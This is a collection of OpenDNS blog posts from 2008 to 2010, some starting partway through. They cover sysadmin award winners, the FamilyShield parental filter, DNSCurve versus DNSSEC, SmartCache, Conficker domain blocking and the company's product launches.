The results? We’re excited to give SysAdmin of the Year honors to Paul Dobbs.\nWhat makes Paul worthy of the prize? He works at the John Howard Society of Durham Region, a nonprofit in Ontario Canada that provides services to nearly 20,000 people per year — and he has a budget of zero dollars per year. Without any annual budget, Paul has increased technology access from 45 computers to nearly 200 computers, from one old NT server to six 2003-R2 servers, unified the network between all offices and reduced Internet costs by more than $6,000 per year.\nAs Paul has gotten JHS new equipment through grants and funding proposals, he’s put the organization in a position where it can actually give computers away to others; it now donates complete systems to JHS clients who have no financial resources to buy their own.\nPaul isn’t the only winner though; here are the other talented award winners:\nK-12 Award: In addition to managing a network of 700 computers, Saint Francis High School’s Larry Steinke has also made the entire campus wireless, set up Saint Frances on VOIP phones, installed Smartboards and created a technology committee to review and establish IT plans. Myron Nessan, Saint Francis’ director of finance, says “he does all this with great personality, professionalism and purpose which is appreciated by all he works with.”\nDevOps Award: The award for DevOps excellence goes to R.I. Pienaar. He wrote mcollective, a distributed sysadmin framework, runs DevOps meetings in London and is a great contributor to Puppet.\nFlying Solo Award: Not too many SysAdmins can say their work saves lives, but Espen Ødegaard can. When the Conficker worm attacked all the workstations as the hospital he worked at, Ødegaard worked tirelessly for three days — by himself — to clean up every workstation. “It is not unlikely that his efforts saved lives,” wrote nominator Odd Henriksen, “considering how little information medical personnel had on their patients while their computers were down.”\nShoestring Budget Award: Alec Cedrone, manager of information systems at Weston Nurseries has saved money on everything from installing Ubiquti Bullet2MP himself to looking to liquidated purchasing options, to choosing OpenDNS for Web content filtering. He estimates his thrifty ways have saved the company almost $35,000.\nNeat Freak Award: Given to Kris Wessels, a SysAdmin in the department of computer science at K.U. Leuven in Belgium. Complete photographic evidence of his cabling prowess can be found here.\nDisaster Response: While taking a long awaited vacation, Matt Sokolow was texted by his boss. There was no Internet connectivity, no network connectivity at the office — nothing was working. Matt wins the disaster response award for spending three plus hours while on vacation on the phone with a general manager, walking her through everything from restarting a DHCP server to reading error logs to restoring from a backup.\nLarge Scale Deployment Award: When Dale Hobbs, network administrator for Lush Cosmetics, began to investigate what employees at Lush’s retail stores were looking at online, he realized the bulk of their web traffic was to non work-related sites. The solution was to deploy OpenDNS — at 149 retail locations across the country. The results? A boost in employee productivity, cost savings for the company, and being given the Large Scale Deployment Award.\nPaul will receive a pass to The USENIX Association’s 24th Large Installation System Administration Conference (LISA ’10) — valued at approximately $900 — and the other award winners will all be given a $50 cash prize. Special appreciation to our friends at The USENIX Association for providing the grand prize!\nThanks to all who entered and we hope to see you on July 28th at the System Administrator Appreciation Party!', 'Announcements', 'https://umbrella.cisco.com/blog/2010/07/02/sysadmin-award-winner/');

And we know parents want to protect their kids from what’s out there. They want to know that what they’ve set up is effective, up-to-date and always working.\nToday we’re introducing a new service called FamilyShield and it’s the absolute simplest and most straightforward way for parents to protect kids from the bad stuff online. There is no complicated set up and no software to install on your computers.\n\nFamilyShield is different from — and better than — the majority of parental controls software choices parents are faced with. For starters, ours is free to use. And when set up on your wireless router, FamilyShield does more than block adult content on computers; it blocks it on Wi-Fi devices like the iPod Touch or the Nintendo DS and on video game consoles like Xbox and Wii. In addition to blocking adult content, FamilyShield also blocks proxies and anonymizers, which are how enterprising/tech-savvy kids often get around parental blocks.\nIn addition, because FamilyShield leverages the OpenDNS content filtering system, the list of sites being blocked is constantly updated, 24/7. These updates happen automatically, without requiring any changes on the user’s end.\nLast but not least, because it runs on the global OpenDNS network, it will make your household Internet faster and overall more reliable. With the OpenDNS perfect 100 percent uptime record, you won’t have to tolerate annoying, intermittent Internet outages anymore. This, of course, is in stark contrast to parental controls software that is often known for slowing down your Internet experience.\nWhy did we launch FamilyShield? For about as long as OpenDNS has been around, we’ve heard demand from you, our users, to provide a pre-configured version of the service that automatically blocks adult content. The idea has been submitted to IdeaBank, the part of our community where anyone can suggest new OpenDNS features and functionality, a few different times. We aim to give you what you want and FamilyShield is just that.\nHow does FamilyShield work? Much like how OpenDNS Basic works, you just follow our simple two-step instructions to configure our special FamilyShield IPs on your router. Unlike OpenDNS Basic, there’s no account to configure, no complicated settings to customize, and no downloads or software to install.  Even if you have a dynamic IP address.\nFamilyShield’s IPs are:\n208.67.222.123\n208.67.220.123\nWhat does FamilyShield Block?  The service blocks pornographic content, including our “Pornography,” “Tasteless,” and “Sexuality” categories, in addition to proxies and anonymizers (which can render filtering useless).  It also blocks phishing and some malware.\nIf you’re using OpenDNS Basic today without any filtering and think FamilyShield looks just simple and straightforward enough for you, just follow the simple instructions to point to the new IPs. But, if you use OpenDNS, love OpenDNS and know of a family who could use a parental controls service that also makes their home network faster, let them know about FamilyShield.', 'Announcements', 'https://umbrella.cisco.com/blog/2010/06/23/introducing-familyshield-parental-controls/');

When the study’s researchers surveyed adult websites, they found that many were aimed at “manipulating and misleading a visitor to perform actions that result in an economic profit” for the Web site. Free sites used these tactics 34 percent of the time, while paid sites used them 11 percent of the time. What types of tactics are we talking about? According to the study, methods include:\nJavascript catchers that hijack the user’s browser, making it difficult to leave a site.\nBlind and hidden links that prevent an address from being displayed in a web browser’s status bar. This can be used to mask malicious activities, like cross site scripting or cross site request forgery attempts.\nRedirection scripts that redirect users to different websites. This occurs on a server, so there’s no way for a user to know it might happen until they click.\nMalware that triggers malicious behavior including “code execution, registry changes, or executable downloads.”\nIn addition to misleading activity, the level of malware found on adult Web sites was surprising to the researchers too; almost 3.5 percent of adult websites had this type of behavior, compared with previous studies that found less than one percent as malicious. Spyware and Trojan downloads were the most popular types of malware.\nThe good news is, it’s simple to block adult content and pornography with OpenDNS. In a couple of steps, you can nip the issue in the bud by blocking content you know causes issues on your computer and network. To block adult content, navigate to the Settings page and select the network you wish to manage. You’ll then see a Choose Your Filtering Level option under Content Filtering. To block all adult content, make sure to block the following five categories: Adult themes, Nudity, Sexuality, Pornography, and Tasteless.\nSince we already block malware for all OpenDNS users (Enterprise users get more comprehensive coverage), blocking pornography is just one more step you can take to protect users on your network from coming in contact with malicious tactics online.', 'Labs Research', 'https://umbrella.cisco.com/blog/2010/06/15/the-risk-is-there-researchers-connect-pornography-and-malware/');

I’ve found the best to be “DNS is like the phone book for the Internet.  You type in a name and it figures out the number.”\nIf DNS is the phone book, domain names are the listings.

Readers of this blog know Matthew has been credited with finding vulnerabilities in both Adobe Flash Player and djbdns.\nEveryone in the DNS community agrees that DNS’s security model is woefully outdated. Conceived at a time when there were fewer computers on the Internet than are housed by even today’s smallest data centers, DNS unfortunately has no strong protection against malicious parties hoping to exploit web users. What little protection it does offer is mostly derived from novel uses of non-security features (e.g., UDP source port and transaction ID randomization).\nFor more than 15 years, the IETF has been working on DNSSEC, a set of extensions to apply digital signatures to DNS. Millions of dollars in government grants and several reboots from scratch later, DNSSEC is just starting to see real world testing. And that testing is minimal — only about 400 of the more than 85,000,000 .com domains support DNSSEC, fewer than 20% of US government agencies met their mandated December 31, 2009 deadline for DNSSEC deployment, and only two of the thirteen root zone name servers is testing with even dummy DNSSEC data.\nAside from its lack of adoption, DNSSEC isn’t even a very satisfactory solution. It adds tremendous complexity to an already fragile protocol, significantly increases DNS traffic in size, encourages questionable security practices, and hamstrings many modern uses of DNS.\nDetails\nComplexity: DNSSEC has many options for enabling/disabling DNSSEC validation, with conflicting interpretations of how to handle different bits; considering people still disagree about how to handle features of DNS that have been present since its inception, I foresee these won’t be resolved anytime soon.\nDNS traffic: Responses right now are usually limited to 512 bytes, sometimes a little more. DNSSEC enabled responses regularly exceed 1500 bytes, requiring IP fragmentation or fallback to TCP. IP fragmentation frequently fails with misconfigured firewalls and using TCP is much slower than the default UDP transport.\nQuestionable security practices: Most users are encouraged to use 512-bit or 1024-bit RSA keys. A group of hobbyists recently worked together to break all of the 512-bit keys used by Texas Instruments for signing their calculator firmware and they did so quickly and easily. The RSA company and NIST have been recommending users switch to 2048-bit keys since 2003 and 2007, respectively. Again, unfortunately, the DNSSEC standards developers are hesitant because bigger crypto is slower, and it will further push the traffic size issue.\nHamstrings modern uses: High traffic DNS servers can’t handle signing every response packet, so they need to pre-compute signatures. This limits how companies like Akamai and Google or projects like the NTP Pool can use DNS for global load balancing and routing users to their nearest servers. It also fundamentally hampers services like OpenDNS, which use DNS to provide content filtering and search services.\nEfficiency: RSA is a very slow crypto standard; its only benefit is that everyone knows about it. DNSSEC can theoretically support other crypto standards, but the IETF has largely ignored efforts from interested parties to add support for faster and stronger algorithms.\nSo while debate about DNSSEC wears on, we’re excited to announce that OpenDNS has fully adopted another proposed DNS security solution: DNSCurve.\nDNSCurve is a recent DNS extension proposal that is fully backwards compatible with the existing DNS protocol, uses much stronger cryptography than DNSSEC, and most importantly, is much simpler and much easier to implement and manage. The most significant technical distinction is that DNSSEC uses large and slow per-recordset signatures while DNSCurve uses small and fast per-packet encryption and authentication.\nOpenDNS’s DNS resolvers already fully support DNSCurve today and use it whenever possible. Of course, authoritative servers need to be upgraded to support DNSCurve as well, but it’s our hope that this announcement will help to get the ball rolling on DNSCurve adoption. If you’re an authoritative DNS provider and are interested in deploying DNSCurve, we’re interested in hearing from you.\nEditor’s note: Our support for DNSCurve doesn’t prevent our adoption of DNSSEC — they are not mutually exclusive. While we have reservations about DNSSEC, we can and will implement it when we see more demand and traction, but in the meantime, when we see a viable technology that can be quickly implemented to improve security for DNS users, that’s a no-brainer in our book.', 'Announcements;Labs Research', 'https://umbrella.cisco.com/blog/2010/02/23/opendns-dnscurve/');

The announcement is significant because it makes OpenDNS Web content filtering a fitting service for a much wider group of companies and organizations.\nSince our Web content filtering began growing in popularity years ago, we’ve heard from potential customers that one of the only hurdles to adoption is the lack of a Block Page Bypass feature. The cost savings and ease-of-use of our service make a very compelling switch-from-Websense or Blue Coat-argument, but for some potential customers, the inability to assign different people the permission to bypass specific categories or websites made our solution unusable in their organization.  For those customers, we’re proud to have a solution available today that will liberate them from the high cost and frustrating experience of managing on-premise filtering appliances.\nIn building this feature we looked at how the appliance vendors perform this function today and realized right away that their approach is highly inefficient.  In order to allow you to bypass one site, they often have to proxy all traffic through their appliance. Anyone who has run a network or managed a filtering box knows this slows down the network significantly and introduces a single point of failure.  The approach we’ve developed is no less intelligent than what you’ve come to expect from OpenDNS.  We proxy only the sites being bypassed, so in effect we give you more granular filtering without decreasing overall performance.  The idea that better security should not impact performance is a theme we talk about a lot internally and is something we think about with everything we do.\nRight out of the gate this feature is available to all OpenDNS Enterprise customers, but later this year will be available in Deluxe as an add-on.\nRead more about Block Page Bypass here and here.', 'Announcements', 'https://umbrella.cisco.com/blog/2010/02/16/block-page-bypass/');

This comes as no surprise as it was only a matter of time before one of the Internet giants realized the strategic importance of DNS.  I’ve received a lot of questions from bloggers, journalists, friends and most importantly, our users. And so I want to share my thoughts on what this means for the recursive DNS space and what it means for OpenDNS.\nFirst, it’s not the same as OpenDNS.  When you use Google DNS, you are getting the experience they prescribe.  When you use OpenDNS, you get the Dashboard controls to manage your experience the way you want for you, your family or your organization. People use OpenDNS because we are pioneers and innovators in the DNS space, offering the most secure recursive DNS service around.  We run the largest DNS caches, the fastest resolvers, and we offer the most flexibility in controlling your DNS experience.   For example, IT folks want to block malware in the DNS, parents sometimes want to block certain content from kids.  All of that and more is possible with our DNS. It is not with Google DNS.  Of course, we don’t force those things, we offer them as controls that you manage the way you see fit. Providing people with choice is core to our offerings.\nSecond, it means that Google realizes that DNS is a critical piece of our Internet’s infrastructure and that it’s of strategic importance to help people safely and reliably navigate the Internet.  This is something we’ve championed since day one and will always keep as our primary mission.  This is why big enterprise customers are switching to OpenDNS too, not because it’s free but because it’s the best and we add value to DNS and improve the security of their networks.\nThird, Google claims that this service is better because it has no ads or redirection.  But you have to remember they are also the largest advertising and redirection company on the Internet.  To think that Google’s DNS service is for the benefit of the Internet would be naive.  They know there is value in controlling more of your Internet experience and I would expect them to explore that fully.  And of course, we always have protected user privacy and have never sold our DNS data.  Here’s a link to our privacy policy.\nFourth, it means that Google is bringing awareness to a wide audience that there is a choice when it comes to DNS and that users don’t have to settle for what their ISP provides.  And we believe that having choice is a good thing — just as Internet users have unbundled their email to services like Gmail, Yahoo! Mail and Hotmail people have been unbundling their DNS and switching to OpenDNS in huge numbers for the last 3+ years because we’re better.\nFifth, it’s not clear that Internet users really want Google to keep control over so much more of their Internet experience than they do already — from Chrome OS at the bottom of the stack to Google Search at the top, it is becoming an end-to-end infrastructure all run by Google, the largest advertising company in the world.  I prefer a heterogeneous Internet with lots of parties collaborating to make this thing work as opposed to an Internet run by one big company.\nSo how will this impact us?  It’s too early to tell, but largely I think this is a good thing for us.  Google DNS currently offers none of the choice and flexibility that our service does. It’s new and untested. Having said that, it encourages us to keep making our service better.  And ultimately, we’re a business that has been growing aggressively since we launched and has been competing in fair markets and winning.  It raises awareness about the importance of DNS and it motivates us to continue providing world-class services to a global audience and to keep innovating.\nWe will continue to do that without distraction from Google or any of the other players in the DNS or security space.

We invented SmartCache — the technology that automatically locates and tries the last known good IP address for Web sites that are having authoritative DNS outages and are completely unreachable on the Internet as a result. SmartCache works to make those Web sites load for OpenDNS users who have SmartCache enabled, while they’re unreachable for everyone else.  It’s this kind of innovation that we’re known for, and probably one of the reasons you choose our service.\nWhen we introduced OpenDNS Deluxe and OpenDNS Enterprise last week, we put SmartCache in the “only available to subscribers” bucket of features.  Any Basic (or free) users who had SmartCache enabled would keep there ability to manage the feature, but going forward it would only appear available to new paying subscribers.  Many of you wrote in to express your concern about our decision: You made the case that SmartCache is core to our DNS service, and something that makes switching from your ISP’s DNS to OpenDNS very compelling.\nSo, starting about 10 minutes ago, users of all versions of OpenDNS get SmartCache for free.  And I hope you turn it on, as it’s quite awesome.\nFinally, it’s the only feature that was removed from the Basic, free service.  We can now accurately say that nothing was removed from the Basic service when we launched our paid services and we won’t be ignoring the free service going forward either; we know a lot of you try the free version first and so you can bet that we will make sure it continues to be a world-class service.', 'Announcements', 'https://umbrella.cisco.com/blog/2009/10/27/smartcache-back-in-basic/');

We didn’t give much detail about the new services but instead gave you a place to tell us if you’d be interested in a paid version of OpenDNS that has more features and no advertisements.\nThe feedback was overwhelming.  And, your feedback helped shape the products we’ve released today.\nHere’s what we’ve learned and tried to deliver:\nThere is huge demand for a clean, premium DNS service. DNS is how people navigate the Internet — And, there is an audience that’s willing to pay for an ad-free version of what we already provide.\n\nSecurity services are too expensive and too complex. For parents at home, the UI for parental controls solutions should be powerful but easy to use.  We work hard to expose the depth of features in a controlled way so users aren’t overwhelmed with choices.  We’re not at Apple-status of simplicity yet, but we’re working on it.   As for price, schools and businesses of all sizes simply looking to keep their users safe and their network secure should be able to manage filtering for multiple locations without consuming all of their IT budget.\nOpenDNS Deluxe and OpenDNS Enterprise address these two points.\nOpenDNS Deluxe is basically an ad-free version of the free service.  It has some additional customization options, an increased whitelist, whitelist-only mode (which limits Web access on your network to only the sites in your whitelist and blocks everything else) and stores your network stats for up to a year, a big boost from the two weeks we store your stats now.  We have priced a family pack version and a per-user version.\nOpenDNS Enterprise is best for school districts and larger businesses. It gives you the ability to share OpenDNS management across a team, delegating read, write and grant privileges, and includes an audit log. It includes comprehensive malware site protection, daily reports about network stats delivered through email you can forward and share easily, and allows you to specify a custom URL for block page landings. It also stores your stats indefinitely.  You can roll out OpenDNS across multiple locations without deploying an appliance at each site in a matter of minutes or hours.\nThere are a few very important things I’d like to clarify about this announcement, however.  First and foremost, the free version you use and love today, what we’re calling OpenDNS Basic, is not going away. Ever. On the contrary it will continue to get better and better over time, with new features and functionality that are good for you, your users and the Internet.  As we expand datacenters and our footprint, you’ll benefit from that, too.  This is all being served on the same platform regardless of package.\nSecond, there’s some confusion around the Malware Site Protection feature, as it relates to all versions of OpenDNS.  Here’s what’s happening: We will continue to block Internet-scale bots and dangerous websites that spread malware in the Basic and Deluxe versions, just as we’ve done with Conficker and the recent Microsoft Zero Day Exploit. We call this Basic Botnet / Malware Protection. The Malware Site Protection feature is different and brand new, never before offered, and is included in OpenDNS Enterprise.  Similarly, we have an expanded list of botnet command and control sites currently only available in the Enterprise version.  It’s our hope to be able to offer this down the product line over time, but for now it’s limited to Enterprise.\nToday is an exciting day for us here at OpenDNS, and the new services are the culmination of lots of hard work from everyone on the OpenDNS team.  We look forward to your feedback as our aim, very clearly, is to give you the features you want.', 'Announcements', 'https://umbrella.cisco.com/blog/2009/10/21/opendns-deluxe-and-opendns-enterprise-have-arrived/');

The innovations and improvements we’ve made to the DNS – a 25 year-old system that hadn’t been updated at all before OpenDNS came along – can’t be underestimated. With your help, we’ve built the world’s largest clearinghouse of phishing data and a community-powered Web content filtering system that keeps Internet users at schools, libraries, businesses and in households around the globe safe online. We’ve made Internet navigation more intelligent, provided you a better DNS than that from your ISP and delivered innovations like SmartCache and Conficker protection.  In short – as a company and as a community we’ve built something really great.\nOver the past few years we’ve been approached more and more frequently by other organizations wanting to integrate the OpenDNS service or some part of the OpenDNS service – our Web content filtering, or our faster, more reliable DNS – into their products and services. In many cases, their customers are actually asking for OpenDNS integration to make it easier for techies and non-techies alike to use our services. We’ve heard the same from you, too – many of you have asked us directly to work with router companies and make OpenDNS more accessible and easier to set up.\nIn January we announced a partnership with NETGEAR, a world-class router manufacturer, to deliver Web content filtering and phishing protection to its customers. And later this summer many new model NETGEAR routers will offer parental controls powered by OpenDNS, giving NETGEAR customers around the world an easy way to use our service.\nAnd so today I am pleased to introduce Best Path Networks, a new arm of OpenDNS that will work to provide our services to partners. Each integration and partnership will be different – customized to provide value to different audiences.  Where one partner elects to integrate and provide our Web content filtering and phishing protection, another partner might want only our faster, more reliable DNS, and sometimes a partner may choose to white-label the service as their own – and that’s okay with us.\nMaking OpenDNS available to more people is good for the Internet. It means more people are protected from phishing and other nefarious activities, and it means more people have a choice in their DNS.  It also means the Internet performs more reliably and people are forced to tolerate fewer outages.  It also means we’ll continue spending resources on improving and extending the OpenDNS network for you since all of our partners will be utilizing our existing (and growing) infrastructure.\nWe know you use OpenDNS because you love the service, so we’ve taken specific steps to ensure using OpenDNS will always be your choice. We also want to make sure you know we won’t form a partnership with any organization that limits your ability to use OpenDNS as you do today.\nIt’s been three years since we started OpenDNS and it seems like we’ve accomplished a lot, but we’ve only just begun innovating – we have a roadmap of great new features we’ll continue to deliver to you throughout the course of this year that we’ll announce here on this blog.

SmartCache, our new DNS record-handling technology, renders frustrating authoritative DNS outages irrelevant for OpenDNS users. It’s both incredibly simple and invaluable to Internet users.\nHere’s how it works: When an authoritative DNS provider suffers an outage, all of the Web sites it provides service to are taken offline. They’re inaccessible for everyone on the Internet. But no longer for OpenDNS users. Our servers will now immediately look for the last known good address for the site in our caches, and use that to load the site. So effectively OpenDNS users will be able to access Web sites that appear down for everyone else. For our millions of users at businesses, schools and libraries around the world, saving them Internet access interruptions and the time they waste is invaluable.\nAuthoritative DNS outages happen frequently and can be a big problem. Just a few weeks ago, it’s reported that major authoritative DNS provider UltraDNS suffered an outage that took Salesforce.com, Amazon.com and Petco.com offline for several hours. In such a case, SmartCache would fix the inaccessibility problem and allow people to visit the sites through the outage.\nThis is just the latest in a long series of DNS innovations we’ve developed and passed on to you. Most recently it was blocking the Conficker worm from phoning home. By blocking the domain names the worm used, we were and continue to be able to protect people around the globe. Trust that we’re committed to continue to innovate and give you easy-to-use services that make your Internet experience better.\nSmartCache is available immediately as an opt-in feature.

Learn more.\nBy now you’ve likely heard the speculation that April 1, April Fools Day, is the date Conficker kicks into action.  And unfortunately this isn’t a joke. The virus, also known as Downadup, leverages a known vulnerability in the Windows OS and has the potential to do some serious damage. Some estimates for number of  machines infected so far are as high as 15 million.  The Internet is abuzz with news about the virus and predictions about what it will do.\nAs your DNS provider of choice, we’re in a unique and advantageous position to help keep our users safe.  OpenDNS has kept our users safe from Conficker for the past several months by blocking the domains it uses to phone home. (We’ve seen lots of you start using our service to protect your networks from the worm.)\nThe latest variant of Conficker is now churning through 50,000 domains per day in an attempt to thwart blocking attempts.  Consider this: at any given time we have filters that hold well over 1,000,000 domains (when you combine our phishing and domain tagging filters).  50,000 domains a day isn’t going to rock the boat.\nSo here’s our update: OpenDNS will continue to identify the domains, all 50,000, and block them from resolving for all OpenDNS users. This means even if the virus has penetrated machines on your network, its rendered useless because it cannot connect back to the botnet.  If you want to disinfect your computer we recommend you check out the tools from our friends over at Kaspersky Lab.\nIf you’re already using OpenDNS, you’re all set.

Here’s an overview to get everyone up to speed on what OpenDNS has cooked up.\nThe first announcement is about the comeback – and improvement – of the much-loved and anticipated Stats System. Stats are invaluable to network administrators: they give you insight into what’s happening on your network coupled with the tools to do something about it. The old system, which was overloaded and barely processing our nearly 9 billions DNS queries per day, was down for awhile as we made improvements.  Sometimes you have to take a step back in order to take three steps forward. Thanks to everyone for your patience as we got it back up and running. I hope you’ll find it was worth the wait.\nNew functionality in the Stats System includes the comeback of the Top Domains report. This feature gives you a list of the top Web sites visited from your network and affords you unique insight into where your resources are being consumed, and which inappropriate or unsafe websites people are seeing. Top Domains now integrates directly with our Web content filtering system. This means you can look at Top Domains, see something you want blocked and block either the site or the category it fits into with a single click. (Example: Facebook.com is one of your Top Domains. Without leaving that screen you can block with Facebook.com or “Social Networks.”) Check out this screencast, narrated by the engineer who built it, Richard Crowley, to see the new system in action.\nThe second announcement is significant to all OpenDNS users as well as the entire Internet community. Today we’ve rolled out a way for you to see if Conficker is living on your network. The Conficker worm, also called Downadup and Kido, is massive. Some estimates of how many PCs are compromised are as high as 10 million. What’s interesting about this particular virus is that it uses the Domain Name System in a unique way: Conficker contains an algorithm that checks 250 new domains per day for instructions on what it should do. This puts us in a unique position to keep you safe since we’re in the unique position of providing insight and intelligence into your DNS service. We’ve teamed with Kaspersky Lab to identify those 250 daily domains, and stop resolving them. This means if you’re using OpenDNS, Conficker will do your network no damage. Yet another reason for your friends and colleagues to make the switch.  While OpenDNS represents just a tiny drop in the sea of the Internet users today, we think this is a smart move forward.\nTo find out if Conficker has penetrated your network, simply log in to your account and select Stats on the left sidebar. From there choose Blocked Domains and filter “only domains blocked as malware.” This will generate a list of malware sites your network has attempted to connect with.\nThis is just the beginning, folks. We’ve got a year’s worth of new features we’re cranking hard on to make your network better performing and more secure.

A brand new video tutorial. This is a biggie, and something we’ve wanted to do for a long time. OpenDNS is not always the easiest thing to explain. All Internet users relate to the frustration of unreliable Internet and slow page-load times, and see the value of free Web content filtering. When we say OpenDNS is a service that’ll make your Internet safer, faster, smarter and more reliable, free, everyone wants it. But the setting up part — the finding your DNS settings and swapping your ISP’s IP addresses for OpenDNS’s — sometimes presents a challenge. The video tutorial walks you through the entire process in under 5 minutes.\n2. Schedule a Demo // Request References services.  This one is not new, necessarily, but since we’ve never really called your attention to it, I figured now’s as good a time as any. The Schedule a Demo and Request References were really designed with larger organizations in mind. We’ve learned that when you guys make a decision about using a new technology on your network, there are often lots of different folks involved in the decision making process. Sometimes there’s even paperwork that needs to be filled out, and calls that need to be made to existing, happy users of the service in question. Scheduling a demo couldn’t be easier. Just tell us a bit about you and your organization to prepare the OpenDNS rep who’ll do the demoing. Invite coworkers and get all of your questions answered on one snappy call. Same thing for requesting references. We’ll match you with an organization that’s similiar to yours.  Have you seen how many happy customers we have?\n3. Expanded router selection.

Today we offer instructions for 16 different router manufacturers from the well-known Linksys, NETGEAR and D-Links to some more rare models.

There is an inconvenient runway in between the facilities. To communicate between the buildings a Point to Point Wireless bridge was put in place. The furthest facility’s LAN and WAN connections were routed over the bridge. During one thunderstorm a lighting strike hit a nearby utility pole and leapt to our antenna in its search for ground. This completely incapacitated the PTP Wireless bridge since the antenna wire now had large holes burnt in it.\nWhen this happened our Systems Administrator was in his second week and the boss (i.e. the rest of the IT department) was on a business trip and out of communication. Within the first hour the extent of damage was determined and a vendor was brought in to make a repair. Unfortunately, the equipment was rather old and parts could not be acquired to repair it, nor would he have wanted to since it was only 3Mbps. It was going to take a week to get the parts in and the devices reinstalled. \nWithin the second hour management was notified, a budget was created, and a communication plan was drafted. All information was to be routed through a few key individuals to keep himself free to find solutions. A makeshift call center was created in the IT office and conference rooms. A representative from each department was setup with a computer. The sales guy would create quotes and process orders, the shipping guy would search for locations in inventory and process pick tickets, and so on and so forth. Phone lines were cleared and designated for this inter site communication. A typical part being sold would take three phone calls to three different people, but within two hours parts and maintenance were moving again. Sean was using these people as a Quasi-Modem TM – Patent Pending.\nSean made it a point to update management twice a day on progress and ensured the vendors were making progress in getting the new equipment. The event happened on a Tuesday and by Friday afternoon everything was up and running. Not only that but the network was running faster at 11Mpbs. While business for the 50 employees in the remote facility certainly was a little slower and a lot more tedious things continued to operate. The IT Manger returned to find his network running better than it ever had.\nSince the incident Sean has become the IT Manager for our company. One of the biggest changes he has made since the incident was negotiating a deal with a local carrier for Dark Fiber so that facilities would not have to worry about a similar event.

Its role is to provide out-of-band CLI connectivity to servers and routers. Over time, at least two ports on its console cable have gone bad. Obviously, we have a good power infrastructure where that device is located. Yes, it is running older code but it hasn’t ran into any problems for awhile. At least two other terminal servers are exhibiting uptimes of at least 8 years.”\nTom’s friends say that Tom is a fantastic engineer who prides himself on his ability to design and deploy stable and reliable infrastructure in all corners of the planet under all kinds of harsh environments.  He spends most of his time online, which is part of the reason he makes sure that the infrastructure on the Internet is really stable.  Tom has also previously given technical presentations in major industry forums such as NANOG and #IX.\nShoestring Budget Award\nWinner: Luke Popejoy, SysAdmin for Integrity Computer Services\nNominated by: Mark Sanger\nMark says: “Luke Popejoy took our ‘little’ radio stations with about 21 computers and cleaned up our network and IT needs, literally overnight.  Knowing we are a very small company, but have a giant need for computers to run our radio stations, Luke literally started working on our machines before he was even hired or even considered all our needs.  He said, ‘you guys seem like good people so let me just take care of a few simple things for you right now while I’m here.’  UNHEARD OF!!  Then when we got his quote we quickly negotiated and Luke is making the computers work for us.  He is always monitoring and suggesting things to improve our network and our uses of our machines.\nWe have two industry specific pieces of software that run two different pieces of software, then it all integrates with windows servers, novell, Linux, a few machines with the first version of windows running on it and then it all talks using DOS, audio files, FTP, streaming, VNC, and whole bunch of other ‘protocols.’  So how much would it have cost, estimates were from $20,000-$25,000 for a new system and then networking costs and some hourly rates… way too much and not even affordable for us.  Luke negotiated us into an extremely reasonable monthly fee for any support and help we need and at any time we need it, no hidden costs… If we need a new ‘drive’ or ‘memory’ we pay for it but there is no additional fee for things.  It is truly an amazing thing!!!  Luke says he doesn’t understand why I’m so amazed at his help… I guess he is humble, but all the parts he’s worked on help us create, produce, broadcast, switch satellites, maintains all our records, accounting, clients, and pretty much allows us to turn the lights on everyday.  For pete’s sake if we had lost one of our machines a month ago, we’d still be recovering and running the entire radio station by hand and having people doing everything manually.  Can you imagine running a radio station without computers??  We can’t and we pray we never have to learn how.\nWhat does all of Luke’s ‘work’ power?  It powers two radio stations in North Carolina, it powers the only local stations in our area, it powers our communities ability to talk about issues and ideas and even buy or sell something daily on the Home Ad show.  It powers a whole bunch of community organizations that rely on our stations to inform the public and help others in our communities. \nWe purchased the radio stations from a company that had giant computer budgets so we more things on the network than we needed or even knew what they were or how to control them.  So, Luke has maximized our network, local machines, backups, security, vpn and several server things that we don’t even know what they are… and much much more… It is almost unbelievable what he has done within a couple of months of working every now and then.  He has done more in a couple months than we did in our first year of owning this place.  Before Luke arrived we were on a domain controller and we were slowly loosing connections to machines and in a few cases we lost access to the actual machines.  It was truly a nightmare!!  We could not get access to, nor figure out the domain controller work, nor could we afford to hire someone, full, part, or anytime, let alone pay for any parts that most of the IT people we interviewed said that we had to have.  NOT Luke, he has taken what we have and makes it work for us… yes, he’s recommended some upgrades as we get the money, but he took what we had, merged and converged it, and now we have a great network!  I can actually sleep good at night knowing that we have access to all our machines if the power goes out.”\nFlying Solo Award\nWinner: Adam Merritt, SysAdmin for MaxWiFi\nNominated by: Richard Hughes\nRichard says: “[Adam] joined us 2 years ago as our first employee and was thrown into the deep-end, configuring and managing networks including VoIP, WiFi & Fixed across major events sites such as the Open Golf, The Stella Artois Tennis Tournament, The World Rally GB and many many more.\nPerhaps he should also be in the shoestring budget category as we are a struggling company so most of Cisco gear is rented in and arrives 2 or 3 days before we install a network.\nAdam is in sole control of designing the network, configuring the equipment and managing the deployment of all services on a temporary basis.\nThis year we started on-site at the Stella Artois Tennis with 17 ADSL’s, 2km of ethernet, 5 routers, 19 POE switches, 68 VoIP handsets, 20 APs, (http://www.lta.org.uk/Watch/Individual-Tournaments/The-British-Tennis-Championships/) had two days break after that before deploying at the European Open Golf Tournament (http://www.europeantour.com/) 13 ADSL, 1 Router, 4 POE Switches, 52 VoIP 12 AP’s.  That finishes as I am writing this and then Adam has to break it all down, drive from London to Scotland (8 hours) and reinstall all of it, plus a lot more, at the Scottish Open Golf tournament (25 ADSL, 8 Routers, 12 switches, 69 VoIP, 14 AP’s)\nHe is also remotely managing the Clipper Round the World Yacht Race Finish in Liverpool, The Tall Ships Race also in Liverpool, an event for the Ministry of Defence and a last minute event for Nokia in London!  Somehow the networks hold together. At the European Open he had his radio taken off him half way through the event as nobody had called him on it as there were no issues!\nPlease remember that the users of the networks come from all over the world as they are journalists and camera crews, sportsmen and various others so we have no idea who is going to do what with our networks.  In amongst all that our 24-year-old Sys Admin passed his CCNA and driving test in the same week.”\nSysAdmin of the Year\n\nWinner: Dan Kaminsky\nNominated by: The Internet community\nThere is little question in our minds that there is nobody who has done more to keep the Internet up and running this year than Dan Kaminsky, the man to thank for identifying a major vulnerability in the Domain Name System. While not technically a SysAdmin at the moment (though he’s worn that hat many times), we feel strongly that Dan deserves the SysAdmin of the Year honor because of the countless hours he’s spent working with SysAdmins all over the world, guiding them through the process of securing their DNS so their networks are not exploited.  Dan has spent the last four months working non-stop to ensure that major backbones, ISPs, vendors and others were patched from a DNS vulnerability that would have had disastrous consequences if not mitigated as much as it already has been.  For that, we have Dan to thank.  And if you think you weren’t going to be impacted by his work, think of all the support requests and trouble tickets you aren’t receiving because he was able to get another network to patch the 